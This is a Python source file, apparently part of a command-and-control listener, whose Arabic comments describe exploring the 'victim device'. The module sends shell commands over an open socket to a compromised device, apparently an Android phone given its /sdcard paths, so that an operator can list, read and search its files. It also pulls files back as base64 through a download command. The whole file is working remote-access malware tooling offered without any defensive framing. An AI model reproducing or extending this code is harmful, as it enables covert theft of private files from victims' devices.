# 📁 c2_listener/commands/file_explorer.py
"""
استكشاف ملفات الجهاز الضحية
"""

import os
import json
import base64
from pathlib import Path

class FileExplorer:
    def __init__(self, session_socket):
        self.socket = session_socket
    
    def execute_command(self, command: str) -> dict:
        """تنفيذ أمر استكشاف الملفات"""
        
        cmd_parts = command.strip().split()
        if len(cmd_parts) < 2:
            return self._send_command("ls /sdcard")
        
        action = cmd_parts[1].lower()
        
        if action == "ls" or action == "dir":
            path = cmd_parts[2] if len(cmd_parts) > 2 else "."
            return self._list_directory(path)
        
        elif action == "cd":
            path = cmd_parts[2] if len(cmd_parts) > 2 else "/"
            return self._change_directory(path)
        
        elif action == "cat" or action == "type":
            if len(cmd_parts) > 2:
                return self._read_file(cmd_parts[2])
        
        elif action == "download":
            if len(cmd_parts) > 2:
                return self._download_file(cmd_parts[2])
        
        elif action == "upload":
            if len(cmd_parts) > 3:
                return self._upload_file(cmd_parts[2], cmd_parts[3])
        
        elif action == "find":
            if len(cmd_parts) > 2:
                return self._find_files(cmd_parts[2])
        
        elif action == "info":
            if len(cmd_parts) > 2:
                return self._get_file_info(cmd_parts[2])
        
        return {"success": False, "error": "أمر غير معروف"}
    
    def _send_command(self, command: str) -> dict:
        """إرسال أمر للسوكيت"""
        try:
            self.socket.send((command + "\n").encode())
            
            # استقبال النتيجة
            result = self._receive_data(timeout=5)
            
            return {
                "success": True,
                "result": result,
                "command": command
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _list_directory(self, path: str) -> dict:
        """سرد محتويات الدليل"""
        command = f"ls -la {path}"
        return self._send_command(command)
    
    def _change_directory(self, path: str) -> dict:
        """تغيير الدليل"""
        command = f"cd {path} && pwd"
        return self._send_command(command)
    
    def _read_file(self, file_path: str) -> dict:
        """قراءة محتوى ملف"""
        command = f"cat {file_path}"
        return self._send_command(command)
    
    def _download_file(self, file_path: str) -> dict:
        """تنزيل ملف"""
        # إرسال أمر لقراءة الملف بصيغة base64
        command = f"cat {file_path} | base64"
        result = self._send_command(command)
        
        if result["success"]:
            try:
                # محاولة فك base64
                decoded = base64.b64decode(result["result"].strip())
                result["file_data"] = decoded
                result["file_size"] = len(decoded)
            except:
                result["success"] = False
                result["error"] = "فشل في فك تشفير الملف"
        
        return result
    
    def _upload_file(self, local_path: str, remote_path: str) -> dict:
        """رفع ملف للجهاز الضحية"""
        # هذا يحتاج لتنفيذ أكثر تعقيداً
        return {"success": False, "error": "غير مدعوم بعد"}
    
    def _find_files(self, pattern: str) -> dict:
        """البحث عن ملفات"""
        command = f"find /sdcard -name '*{pattern}*' 2>/dev/null | head -20"
        return self._send_command(command)
    
    def _get_file_info(self, file_path: str) -> dict:
        """الحصول على معلومات الملف"""
        command = f"stat {file_path} 2>/dev/null || ls -la {file_path}"
        return self._send_command(command)
    
    def _receive_data(self, timeout: int = 5) -> str:
        """استقبال البيانات من السوكيت"""
        # هذا تنفيذ مبسط
        self.socket.settimeout(timeout)
        
        try:
            data = b""
            while True:
                chunk = self.socket.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(chunk) < 4096:
                    break
            return data.decode('utf-8', errors='ignore')
        except:
            return ""